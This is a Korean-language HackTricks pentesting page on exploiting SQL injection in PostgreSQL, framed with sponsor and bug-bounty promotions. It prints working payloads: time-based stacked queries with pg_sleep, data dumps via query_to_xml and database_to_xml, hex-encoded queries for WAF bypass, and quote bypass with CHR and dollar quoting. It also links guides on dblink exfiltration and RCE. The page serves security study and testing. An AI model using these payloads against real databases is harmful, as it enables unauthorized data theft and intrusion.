# PostgreSQL 인젝션

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 저장소에 제출**하세요.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: **Intigriti에 가입**하여 해커들이 만든 프리미엄 **버그 바운티 플랫폼**을 이용하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

***

**이 페이지는 postgresql 데이터베이스에서 발견된 SQL 인젝션을 악용하는 데 도움이 되는 다양한 트릭을 설명하는 것을 목표로 합니다. 또한** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md) **에서 찾을 수 있는 트릭을 보완합니다.**

## 네트워크 상호작용 - 권한 상승, 포트 스캐너, NTLM 챌린지 응답 노출 및 데이터 유출

**PostgreSQL 모듈 `dblink`**는 다른 PostgreSQL 인스턴스에 연결하고 TCP 연결을 실행하는 기능을 제공합니다. 이러한 기능을 `COPY FROM` 기능과 결합하면 권한 상승, 포트 스캐닝 및 NTLM 챌린지 응답 캡처와 같은 작업이 가능합니다. 이러한 공격을 실행하는 방법에 대한 자세한 내용은 [이러한 공격을 수행하는 방법](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md)을 확인하세요.

### **dblink 및 대용량 객체를 사용한 데이터 유출 예제**

[**이 예제**](dblink-lo\_import-data-exfiltration.md)를 읽어보면 **대용량 객체 내에 데이터를 로드한 다음 함수 `dblink_connect`의 사용자 이름**에 대용량 객체의 내용을 유출하는 CTF 예제를 볼 수 있습니다.

## PostgreSQL 공격: 읽기/쓰기, RCE, 권한 상승

PostgreSQL에서 호스트를 침해하고 권한을 상승하는 방법은 다음을 확인하세요:

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## WAF 우회

### PostgreSQL 문자열 함수

문자열 조작은 **WAF 또는 다른 제한을 우회하는 데 도움**이 될 수 있습니다.\
[**이 페이지에서**](https://www.postgresqltutorial.com/postgresql-string-functions/) **유용한 문자열 함수를 찾을 수 있습니다.**

### 스택 쿼리

PostgreSQL은 스택 쿼리를 지원하지만, 여러 응용 프로그램은 1개만 예상하고 2개의 응답이 반환되면 오류가 발생할 수 있습니다. 그러나 시간 인젝션을 통해 여전히 스택 쿼리를 남용할 수 있습니다.
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### XML 트릭

**query\_to\_xml**

이 함수는 XML 형식으로 모든 데이터를 한 파일에 반환합니다. 많은 양의 데이터를 한 행에 덤프하려는 경우 이상적입니다.
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

이 함수는 전체 데이터베이스를 XML 형식으로 덤프하며, 단 한 줄에 저장됩니다 (데이터베이스가 매우 큰 경우 DoS 공격이나 클라이언트 자체에 영향을 줄 수 있으므로 주의해야 합니다):
```sql
SELECT database_to_xml(true,true,'');
```
### 16진수로 된 문자열

**쿼리를 문자열로 전달할 수 있다면** (예를 들어 **`query_to_xml`** 함수를 사용하여), **convert\_from을 사용하여 문자열을 16진수로 전달하고 이를 통해 필터를 우회할 수 있습니다:**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### 금지된 따옴표

만약 페이로드에 따옴표를 사용할 수 없다면, 기본 절에 대해서는 `CHR`을 사용하여 이를 우회할 수 있습니다. (_문자 연결은 SELECT, INSERT, DELETE 등의 기본 쿼리에만 작동하며, 모든 SQL 문에 대해 작동하지는 않습니다._)
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
또는 `$`로도 가능합니다. 이 쿼리들은 동일한 결과를 반환합니다:
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: **Intigriti**에 가입하여 해커들이 만든 프리미엄 버그 바운티 플랫폼에 참여하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
